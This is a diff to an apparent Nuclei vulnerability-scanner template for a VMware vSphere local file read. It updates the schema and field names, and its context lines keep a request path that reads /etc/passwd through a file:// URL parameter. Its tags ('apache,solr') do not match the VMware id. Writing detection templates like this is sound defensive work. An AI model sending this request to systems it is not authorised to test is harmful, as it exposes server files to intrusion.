@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: vmware-vsphere-file-read
 
 info:
@@ -10,11 +11,11 @@ info:
     - https://twitter.com/sec715/status/1373472323538362371
   tags: apache,solr,lfi
 
-requests:
+http:
   - method: GET
     path:
             - '{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd'
-              
+
     matchers-condition: and
     matchers:
       - type: status
